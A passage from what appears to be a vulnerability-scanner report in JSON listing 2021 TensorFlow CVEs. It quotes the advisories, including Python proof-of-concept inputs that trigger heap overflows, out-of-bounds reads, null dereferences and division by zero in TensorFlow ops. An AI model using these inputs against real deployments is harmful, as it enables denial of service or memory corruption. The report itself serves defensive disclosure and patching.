guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Ying Wang and Yakun Zhang of Baidu X-Team.",
                "markdown": "**Vulnerability CVE-2021-29535**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|low|2.4.2|[CVE-2021-29535](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29535)|\n\n### Impact\nAn attacker can cause a heap buffer overflow in `QuantizedMul` by passing in invalid thresholds for the quantization:\n\n```python\nimport tensorflow as tf\n\nx = tf.constant([256, 328], shape=[1, 2], dtype=tf.quint8)\ny = tf.constant([256, 328], shape=[1, 2], dtype=tf.quint8)\nmin_x = tf.constant([], dtype=tf.float32)\nmax_x = tf.constant([], dtype=tf.float32)\nmin_y = tf.constant([], dtype=tf.float32)\nmax_y = tf.constant([], dtype=tf.float32)\n\ntf.raw_ops.QuantizedMul(x=x, y=y, min_x=min_x, max_x=max_x, min_y=min_y, max_y=max_y)\n```\n\nThis is because the [implementation](https://github.com/tensorflow/tensorflow/blob/87cf4d3ea9949051e50ca3f071fc909538a51cd0/tensorflow/core/kernels/quantized_mul_op.cc#L287-L290) assumes that the 4 arguments are always valid scalars and tries to access the numeric value directly:\n\n```cc \nconst float min_x = context-\u003einput(2).flat\u003cfloat\u003e()(0);\nconst float max_x = context-\u003einput(3).flat\u003cfloat\u003e()(0);\nconst float min_y = context-\u003einput(4).flat\u003cfloat\u003e()(0);\nconst float max_y = context-\u003einput(5).flat\u003cfloat\u003e()(0);\n```\n\nHowever, if any of these tensors is empty, then `.flat\u003cT\u003e()` is an empty buffer and accessing the element at position 0 results in overflow.\n\n### Patches\nWe have patched the issue in GitHub commit [efea03b38fb8d3b81762237dc85e579cc5fc6e87](https://github.com/tensorflow/tensorflow/commit/efea03b38fb8d3b81762237dc85e579cc5fc6e87).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Ying Wang and Yakun Zhang of Baidu X-Team."
              },
              "properties": {
                "security-severity": "2.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "low"
                ]
              }
            },
            {
              "id": "CVE-2021-29589",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-29589"
              },
              "defaultConfiguration": {
                "level": "note"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29589",
              "help": {
                "text": "Vulnerability CVE-2021-29589\nSeverity: low\nFixed Version: 2.4.2\nLink: [CVE-2021-29589](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29589)\n### Impact\nThe reference implementation of the `GatherNd` TFLite operator is [vulnerable to a division by zero error](https://github.com/tensorflow/tensorflow/blob/0d45ea1ca641b21b73bcf9c00e0179cda284e7e7/tensorflow/lite/kernels/internal/reference/reference_ops.h#L966):\n\n```cc \nret.dims_to_count[i] = remain_flat_size / params_shape.Dims(i);\n```\n\nAn attacker can craft a model such that `params` input would be an empty tensor. In turn, `params_shape.Dims(.)` would be zero, in at least one dimension.\n\n### Patches\nWe have patched the issue in GitHub commit [8e45822aa0b9f5df4b4c64f221e64dc930a70a9d](https://github.com/tensorflow/tensorflow/commit/8e45822aa0b9f5df4b4c64f221e64dc930a70a9d).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions. \n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.",
                "markdown": "**Vulnerability CVE-2021-29589**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|low|2.4.2|[CVE-2021-29589](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29589)|\n\n### Impact\nThe reference implementation of the `GatherNd` TFLite operator is [vulnerable to a division by zero error](https://github.com/tensorflow/tensorflow/blob/0d45ea1ca641b21b73bcf9c00e0179cda284e7e7/tensorflow/lite/kernels/internal/reference/reference_ops.h#L966):\n\n```cc \nret.dims_to_count[i] = remain_flat_size / params_shape.Dims(i);\n```\n\nAn attacker can craft a model such that `params` input would be an empty tensor. In turn, `params_shape.Dims(.)` would be zero, in at least one dimension.\n\n### Patches\nWe have patched the issue in GitHub commit [8e45822aa0b9f5df4b4c64f221e64dc930a70a9d](https://github.com/tensorflow/tensorflow/commit/8e45822aa0b9f5df4b4c64f221e64dc930a70a9d).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions. \n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360."
              },
              "properties": {
                "security-severity": "2.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "low"
                ]
              }
            },
            {
              "id": "CVE-2021-29598",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-29598"
              },
              "defaultConfiguration": {
                "level": "note"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29598",
              "help": {
                "text": "Vulnerability CVE-2021-29598\nSeverity: low\nFixed Version: 2.4.2\nLink: [CVE-2021-29598](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29598)\n### Impact\nThe implementation of the `SVDF` TFLite operator is [vulnerable to a division by zero error](https://github.com/tensorflow/tensorflow/blob/7f283ff806b2031f407db64c4d3edcda8fb9f9f5/tensorflow/lite/kernels/svdf.cc#L99-L102):\n\n```cc\nconst int rank = params-\u003erank;\n...\nTF_LITE_ENSURE_EQ(context, num_filters % rank, 0);\n```\n\nAn attacker can craft a model such that `params-\u003erank` would be 0.\n\n### Patches\nWe have patched the issue in GitHub commit [6841e522a3e7d48706a02e8819836e809f738682](https://github.com/tensorflow/tensorflow/commit/6841e522a3e7d48706a02e8819836e809f738682).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.",
                "markdown": "**Vulnerability CVE-2021-29598**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|low|2.4.2|[CVE-2021-29598](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29598)|\n\n### Impact\nThe implementation of the `SVDF` TFLite operator is [vulnerable to a division by zero error](https://github.com/tensorflow/tensorflow/blob/7f283ff806b2031f407db64c4d3edcda8fb9f9f5/tensorflow/lite/kernels/svdf.cc#L99-L102):\n\n```cc\nconst int rank = params-\u003erank;\n...\nTF_LITE_ENSURE_EQ(context, num_filters % rank, 0);\n```\n\nAn attacker can craft a model such that `params-\u003erank` would be 0.\n\n### Patches\nWe have patched the issue in GitHub commit [6841e522a3e7d48706a02e8819836e809f738682](https://github.com/tensorflow/tensorflow/commit/6841e522a3e7d48706a02e8819836e809f738682).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360."
              },
              "properties": {
                "security-severity": "2.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "low"
                ]
              }
            },
            {
              "id": "CVE-2021-29540",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-29540"
              },
              "defaultConfiguration": {
                "level": "note"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29540",
              "help": {
                "text": "Vulnerability CVE-2021-29540\nSeverity: low\nFixed Version: 2.4.2\nLink: [CVE-2021-29540](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29540)\n### Impact\nAn attacker can cause a heap buffer overflow to occur in `Conv2DBackpropFilter`:\n\n```python\nimport tensorflow as tf\n\ninput_tensor = tf.constant([386.078431372549, 386.07843139643234],\n                           shape=[1, 1, 1, 2], dtype=tf.float32)\nfilter_sizes = tf.constant([1, 1, 1, 1], shape=[4], dtype=tf.int32)\nout_backprop = tf.constant([386.078431372549], shape=[1, 1, 1, 1],\n                           dtype=tf.float32)\n  \ntf.raw_ops.Conv2DBackpropFilter(\n  input=input_tensor,\n  filter_sizes=filter_sizes,\n  out_backprop=out_backprop,\n  strides=[1, 66, 49, 1],\n  use_cudnn_on_gpu=True,\n  padding=`VALID`,\n  explicit_paddings=[],\n  data_format=`NHWC`,\n  dilations=[1, 1, 1, 1]\n)\n```\n\nAlternatively, passing empty tensors also results in similar behavior: \n\n```python\nimport tensorflow as tf\n\ninput_tensor = tf.constant([], shape=[0, 1, 1, 5], dtype=tf.float32)\nfilter_sizes = tf.constant([3, 8, 1, 1], shape=[4], dtype=tf.int32)\nout_backprop = tf.constant([], shape=[0, 1, 1, 1], dtype=tf.float32)\n\ntf.raw_ops.Conv2DBackpropFilter(\n  input=input_tensor,\n  filter_sizes=filter_sizes, \n  out_backprop=out_backprop,\n  strides=[1, 66, 49, 1], \n  use_cudnn_on_gpu=True,\n  padding=`VALID`,\n  explicit_paddings=[],\n  data_format=`NHWC`,\n  dilations=[1, 1, 1, 1]\n)\n```\n\nThis is because the [implementation](https://github.com/tensorflow/tensorflow/blob/1b0296c3b8dd9bd948f924aa8cd62f87dbb7c3da/tensorflow/core/kernels/conv_grad_filter_ops.cc#L495-L497) computes the size of the filter tensor but does not validate that it matches the number of elements in `filter_sizes`. Later, when reading/writing to this buffer, code uses the value computed here, instead of the number of elements in the tensor.\n\n### Patches \nWe have patched the issue in GitHub commit [c570e2ecfc822941335ad48f6e10df4e21f11c96](https://github.com/tensorflow/tensorflow/commit/c570e2ecfc822941335ad48f6e10df4e21f11c96).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team.",
                "markdown": "**Vulnerability CVE-2021-29540**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|low|2.4.2|[CVE-2021-29540](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29540)|\n\n### Impact\nAn attacker can cause a heap buffer overflow to occur in `Conv2DBackpropFilter`:\n\n```python\nimport tensorflow as tf\n\ninput_tensor = tf.constant([386.078431372549, 386.07843139643234],\n                           shape=[1, 1, 1, 2], dtype=tf.float32)\nfilter_sizes = tf.constant([1, 1, 1, 1], shape=[4], dtype=tf.int32)\nout_backprop = tf.constant([386.078431372549], shape=[1, 1, 1, 1],\n                           dtype=tf.float32)\n  \ntf.raw_ops.Conv2DBackpropFilter(\n  input=input_tensor,\n  filter_sizes=filter_sizes,\n  out_backprop=out_backprop,\n  strides=[1, 66, 49, 1],\n  use_cudnn_on_gpu=True,\n  padding=`VALID`,\n  explicit_paddings=[],\n  data_format=`NHWC`,\n  dilations=[1, 1, 1, 1]\n)\n```\n\nAlternatively, passing empty tensors also results in similar behavior: \n\n```python\nimport tensorflow as tf\n\ninput_tensor = tf.constant([], shape=[0, 1, 1, 5], dtype=tf.float32)\nfilter_sizes = tf.constant([3, 8, 1, 1], shape=[4], dtype=tf.int32)\nout_backprop = tf.constant([], shape=[0, 1, 1, 1], dtype=tf.float32)\n\ntf.raw_ops.Conv2DBackpropFilter(\n  input=input_tensor,\n  filter_sizes=filter_sizes, \n  out_backprop=out_backprop,\n  strides=[1, 66, 49, 1], \n  use_cudnn_on_gpu=True,\n  padding=`VALID`,\n  explicit_paddings=[],\n  data_format=`NHWC`,\n  dilations=[1, 1, 1, 1]\n)\n```\n\nThis is because the [implementation](https://github.com/tensorflow/tensorflow/blob/1b0296c3b8dd9bd948f924aa8cd62f87dbb7c3da/tensorflow/core/kernels/conv_grad_filter_ops.cc#L495-L497) computes the size of the filter tensor but does not validate that it matches the number of elements in `filter_sizes`. Later, when reading/writing to this buffer, code uses the value computed here, instead of the number of elements in the tensor.\n\n### Patches \nWe have patched the issue in GitHub commit [c570e2ecfc822941335ad48f6e10df4e21f11c96](https://github.com/tensorflow/tensorflow/commit/c570e2ecfc822941335ad48f6e10df4e21f11c96).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team."
              },
              "properties": {
                "security-severity": "2.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "low"
                ]
              }
            },
            {
              "id": "CVE-2021-29513",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-29513"
              },
              "defaultConfiguration": {
                "level": "note"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29513",
              "help": {
                "text": "Vulnerability CVE-2021-29513\nSeverity: low\nFixed Version: 2.4.2\nLink: [CVE-2021-29513](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29513)\n### Impact\nCalling TF operations with tensors of non-numeric types when the operations expect numeric tensors result in null pointer dereferences.\n\nThere are multiple ways to reproduce this, listing a few examples here:\n\n```python\nimport tensorflow as tf\nimport numpy as np\ndata = tf.random.truncated_normal(shape=1,mean=np.float32(20.8739),stddev=779.973,dtype=20,seed=64)\n```\n\n```python\nimport tensorflow as tf\nimport numpy as np\ndata =\ntf.random.stateless_truncated_normal(shape=1,seed=[63,70],mean=np.float32(20.8739),stddev=779.973,dtype=20)\n```\n\n```python\nimport tensorflow as tf\nimport numpy as np\ndata = tf.one_hot(indices=[62,50],depth=136,on_value=np.int32(237),off_value=158,axis=856,dtype=20)\n```\n\n```python\nimport tensorflow as tf\nimport numpy as np\ndata = tf.range(start=np.int32(214),limit=660,delta=129,dtype=20)\n```\n\n```python\nimport tensorflow as tf\nimport numpy as np\ndata = tf.raw_ops.ResourceCountUpTo(resource=np.int32(30), limit=872, T=3)\n```\n\n```python\nimport tensorflow as tf\nimport numpy as np\n\nwriter_array = np.array([1,2],dtype=np.int32)\nwriter_tensor = tf.convert_to_tensor(writer_array,dtype=tf.resource)\n```\n\nAll these examples and similar ones have the same behavior: the [conversion from Python array to C++ array](https://github.com/tensorflow/tensorflow/blob/ff70c47a396ef1e3cb73c90513da4f5cb71bebba/tensorflow/python/lib/core/ndarray_tensor.cc#L113-L169) is vulnerable to a type confusion:\n\n```cc\n  int pyarray_type = PyArray_TYPE(array);\n  PyArray_Descr* descr = PyArray_DESCR(array);\n  switch (pyarray_type) {\n    ...\n    case NPY_VOID:\n      // Quantized types are currently represented as custom struct types.\n      // PyArray_TYPE returns NPY_VOID for structs, and we should look into\n      // descr to derive the actual type.\n      // Direct feeds of certain types of ResourceHandles are represented as a\n      // custom struct type.\n      return PyArrayDescr_to_TF_DataType(descr, out_tf_datatype);\n    ...\n  }\n```\n\nFor the tensor types involved in the above example, the `pyarray_type` is `NPY_VOID` but the `descr` field is such that `descr-\u003efield = NULL`. Then [`PyArrayDescr_to_TF_DataType`](https://github.com/tensorflow/tensorflow/blob/ff70c47a396ef1e3cb73c90513da4f5cb71bebba/tensorflow/python/lib/core/ndarray_tensor.cc#L72-L77) will trigger a null dereference:\n\n```cc\nStatus PyArrayDescr_to_TF_DataType(PyArray_Descr* descr,\n                                   TF_DataType* out_tf_datatype) {\n  PyObject* key;\n  PyObject* value;\n  Py_ssize_t pos = 0;\n  if (PyDict_Next(descr-\u003efields, \u0026pos, \u0026key, \u0026value)) {\n    ...\n  }\n}\n```\n\nThis is because the Python`s `PyDict_Next` implementation would dereference the first argument.\n\n### Patches\nWe have patched the issue in GitHub commit [030af767d357d1b4088c4a25c72cb3906abac489](https://github.com/tensorflow/tensorflow/commit/030af767d357d1b4088c4a25c72cb3906abac489).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360 as well as Ye Zhang and Yakun Zhang of Baidu X-Team.",
                "markdown": "**Vulnerability CVE-2021-29513**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|low|2.4.2|[CVE-2021-29513](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29513)|\n\n### Impact\nCalling TF operations with tensors of non-numeric types when the operations expect numeric tensors result in null pointer dereferences.\n\nThere are multiple ways to reproduce this, listing a few examples here:\n\n```python\nimport tensorflow as tf\nimport numpy as np\ndata = tf.random.truncated_normal(shape=1,mean=np.float32(20.8739),stddev=779.973,dtype=20,seed=64)\n```\n\n```python\nimport tensorflow as tf\nimport numpy as np\ndata =\ntf.random.stateless_truncated_normal(shape=1,seed=[63,70],mean=np.float32(20.8739),stddev=779.973,dtype=20)\n```\n\n```python\nimport tensorflow as tf\nimport numpy as np\ndata = tf.one_hot(indices=[62,50],depth=136,on_value=np.int32(237),off_value=158,axis=856,dtype=20)\n```\n\n```python\nimport tensorflow as tf\nimport numpy as np\ndata = tf.range(start=np.int32(214),limit=660,delta=129,dtype=20)\n```\n\n```python\nimport tensorflow as tf\nimport numpy as np\ndata = tf.raw_ops.ResourceCountUpTo(resource=np.int32(30), limit=872, T=3)\n```\n\n```python\nimport tensorflow as tf\nimport numpy as np\n\nwriter_array = np.array([1,2],dtype=np.int32)\nwriter_tensor = tf.convert_to_tensor(writer_array,dtype=tf.resource)\n```\n\nAll these examples and similar ones have the same behavior: the [conversion from Python array to C++ array](https://github.com/tensorflow/tensorflow/blob/ff70c47a396ef1e3cb73c90513da4f5cb71bebba/tensorflow/python/lib/core/ndarray_tensor.cc#L113-L169) is vulnerable to a type confusion:\n\n```cc\n  int pyarray_type = PyArray_TYPE(array);\n  PyArray_Descr* descr = PyArray_DESCR(array);\n  switch (pyarray_type) {\n    ...\n    case NPY_VOID:\n      // Quantized types are currently represented as custom struct types.\n      // PyArray_TYPE returns NPY_VOID for structs, and we should look into\n      // descr to derive the actual type.\n      // Direct feeds of certain types of ResourceHandles are represented as a\n      // custom struct type.\n      return PyArrayDescr_to_TF_DataType(descr, out_tf_datatype);\n    ...\n  }\n```\n\nFor the tensor types involved in the above example, the `pyarray_type` is `NPY_VOID` but the `descr` field is such that `descr-\u003efield = NULL`. Then [`PyArrayDescr_to_TF_DataType`](https://github.com/tensorflow/tensorflow/blob/ff70c47a396ef1e3cb73c90513da4f5cb71bebba/tensorflow/python/lib/core/ndarray_tensor.cc#L72-L77) will trigger a null dereference:\n\n```cc\nStatus PyArrayDescr_to_TF_DataType(PyArray_Descr* descr,\n                                   TF_DataType* out_tf_datatype) {\n  PyObject* key;\n  PyObject* value;\n  Py_ssize_t pos = 0;\n  if (PyDict_Next(descr-\u003efields, \u0026pos, \u0026key, \u0026value)) {\n    ...\n  }\n}\n```\n\nThis is because the Python`s `PyDict_Next` implementation would dereference the first argument.\n\n### Patches\nWe have patched the issue in GitHub commit [030af767d357d1b4088c4a25c72cb3906abac489](https://github.com/tensorflow/tensorflow/commit/030af767d357d1b4088c4a25c72cb3906abac489).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360 as well as Ye Zhang and Yakun Zhang of Baidu X-Team."
              },
              "properties": {
                "security-severity": "2.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "low"
                ]
              }
            },
            {
              "id": "CVE-2021-29613",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-29613"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29613",
              "help": {
                "text": "Vulnerability CVE-2021-29613\nSeverity: medium\nFixed Version: 2.4.2\nLink: [CVE-2021-29613](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29613)\n### Impact \nIncomplete validation in `tf.raw_ops.CTCLoss` allows an attacker to trigger an OOB read from heap:\n\n```python\nimport tensorflow as tf\n\ninputs = tf.constant([], shape=[10, 16, 0], dtype=tf.float32)\nlabels_indices = tf.constant([], shape=[8, 0], dtype=tf.int64)\nlabels_values = tf.constant([-100] * 8, shape=[8], dtype=tf.int32)\nsequence_length = tf.constant([-100] * 16, shape=[16], dtype=tf.int32)\n  \ntf.raw_ops.CTCLoss(inputs=inputs, labels_indices=labels_indices,\n                   labels_values=labels_values, sequence_length=sequence_length,\n                   preprocess_collapse_repeated=True, ctc_merge_repeated=False,\n                   ignore_longer_outputs_than_inputs=True)\n```   \n      \nAn attacker can also trigger a heap buffer overflow:\n\n```python\nimport tensorflow as tf\n\ninputs = tf.constant([], shape=[7, 2, 0], dtype=tf.float32)\nlabels_indices = tf.constant([-100, -100], shape=[2, 1], dtype=tf.int64)\nlabels_values = tf.constant([-100, -100], shape=[2], dtype=tf.int32)\nsequence_length = tf.constant([-100, -100], shape=[2], dtype=tf.int32)\n\ntf.raw_ops.CTCLoss(inputs=inputs, labels_indices=labels_indices,\n                   labels_values=labels_values, sequence_length=sequence_length,\n                   preprocess_collapse_repeated=False, ctc_merge_repeated=False,\n                   ignore_longer_outputs_than_inputs=False)\n```\n\nFinally, an attacker can trigger a null pointer dereference:\n\n```python \nimport tensorflow as tf\n\ninputs = tf.constant([], shape=[0, 2, 11], dtype=tf.float32)\nlabels_indices = tf.constant([], shape=[0, 2], dtype=tf.int64)\nlabels_values = tf.constant([], shape=[0], dtype=tf.int32)\nsequence_length = tf.constant([-100, -100], shape=[2], dtype=tf.int32)\n\ntf.raw_ops.CTCLoss(inputs=inputs, labels_indices=labels_indices,\n                   labels_values=labels_values, sequence_length=sequence_length,\n                   preprocess_collapse_repeated=False, ctc_merge_repeated=False,\n                   ignore_longer_outputs_than_inputs=False)\n```\n\n### Patches\nWe have patched the issue in GitHub commit[14607c0707040d775e06b6817325640cb4b5864c](https://github.com/tensorflow/tensorflow/commit/14607c0707040d775e06b6817325640cb4b5864c) followed by GitHub commit [4504a081af71514bb1828048363e6540f797005b](https://github.com/tensorflow/tensorflow/commit/4504a081af71514bb1828048363e6540f797005b).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick these commits on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team.",
                "markdown": "**Vulnerability CVE-2021-29613**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.4.2|[CVE-2021-29613](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29613)|\n\n### Impact \nIncomplete validation in `tf.raw_ops.CTCLoss` allows an attacker to trigger an OOB read from heap:\n\n```python\nimport tensorflow as tf\n\ninputs = tf.constant([], shape=[10, 16, 0], dtype=tf.float32)\nlabels_indices = tf.constant([], shape=[8, 0], dtype=tf.int64)\nlabels_values = tf.constant([-100] * 8, shape=[8], dtype=tf.int32)\nsequence_length = tf.constant([-100] * 16, shape=[16], dtype=tf.int32)\n  \ntf.raw_ops.CTCLoss(inputs=inputs, labels_indices=labels_indices,\n                   labels_values=labels_values, sequence_length=sequence_length,\n                   preprocess_collapse_repeated=True, ctc_merge_repeated=False,\n                   ignore_longer_outputs_than_inputs=True)\n```   \n      \nAn attacker can also trigger a heap buffer overflow:\n\n```python\nimport tensorflow as tf\n\ninputs = tf.constant([], shape=[7, 2, 0], dtype=tf.float32)\nlabels_indices = tf.constant([-100, -100], shape=[2, 1], dtype=tf.int64)\nlabels_values = tf.constant([-100, -100], shape=[2], dtype=tf.int32)\nsequence_length = tf.constant([-100, -100], shape=[2], dtype=tf.int32)\n\ntf.raw_ops.CTCLoss(inputs=inputs, labels_indices=labels_indices,\n                   labels_values=labels_values, sequence_length=sequence_length,\n                   preprocess_collapse_repeated=False, ctc_merge_repeated=False,\n                   ignore_longer_outputs_than_inputs=False)\n```\n\nFinally, an attacker can trigger a null pointer dereference:\n\n```python \nimport tensorflow as tf\n\ninputs = tf.constant([], shape=[0, 2, 11], dtype=tf.float32)\nlabels_indices = tf.constant([], shape=[0, 2], dtype=tf.int64)\nlabels_values = tf.constant([], shape=[0], dtype=tf.int32)\nsequence_length = tf.constant([-100, -100], shape=[2], dtype=tf.int32)\n\ntf.raw_ops.CTCLoss(inputs=inputs, labels_indices=labels_indices,\n                   labels_values=labels_values, sequence_length=sequence_length,\n                   preprocess_collapse_repeated=False, ctc_merge_repeated=False,\n                   ignore_longer_outputs_than_inputs=False)\n```\n\n### Patches\nWe have patched the issue in GitHub commit[14607c0707040d775e06b6817325640cb4b5864c](https://github.com/tensorflow/tensorflow/commit/14607c0707040d775e06b6817325640cb4b5864c) followed by GitHub commit [4504a081af71514bb1828048363e6540f797005b](https://github.com/tensorflow/tensorflow/commit/4504a081af71514bb1828048363e6540f797005b).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick these commits on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team."
              },
              "properties": {
                "security-severity": "6.3",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2021-29576",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-29576"
              },
              "defaultConfiguration": {
                "level": "note"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29576",
              "help": {
                "text": "Vulnerability CVE-2021-29576\nSeverity: low\nFixed Version: 2.4.2\nLink: [CVE-2021-29576](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29576)\n### Impact\nThe implementation of `tf.raw_ops.MaxPool3DGradGrad` is vulnerable to a heap buffer overflow: \n\n```python\nimport tensorflow as tf\n\nvalues = [0.01] * 11\norig_input = tf.constant(values, shape=[11, 1, 1, 1, 1], dtype=tf.float32)\norig_output = tf.constant([0.01], shape=[1, 1, 1, 1, 1], dtype=tf.float32)\ngrad = tf.constant([0.01], shape=[1, 1, 1, 1, 1], dtype=tf.float32)\nksize = [1, 1, 1, 1, 1]\nstrides = [1, 1, 1, 1, 1]\npadding = \"SAME\"\n\ntf.raw_ops.MaxPool3DGradGrad(\n    orig_input=orig_input, orig_output=orig_output, grad=grad, ksize=ksize,\n    strides=strides, padding=padding)\n```\n\nThe [implementation](https://github.com/tensorflow/tensorflow/blob/596c05a159b6fbb9e39ca10b3f7753b7244fa1e9/tensorflow/core/kernels/pooling_ops_3d.cc#L694-L696) does not check that the initialization of `Pool3dParameters` completes successfully:\n\n```cc\nPool3dParameters params{context,  ksize_,       stride_,\n                        padding_, data_format_, tensor_in.shape()};\n```\n\nSince [the constructor](https://github.com/tensorflow/tensorflow/blob/596c05a159b6fbb9e39ca10b3f7753b7244fa1e9/tensorflow/core/kernels/pooling_ops_3d.cc#L48-L88) uses `OP_REQUIRES` to validate conditions, the first assertion that fails interrupts the initialization of `params`, making it contain invalid data. In turn, this might cause a heap buffer overflow, depending on default initialized values.\n\n### Patches\nWe have patched the issue in GitHub commit 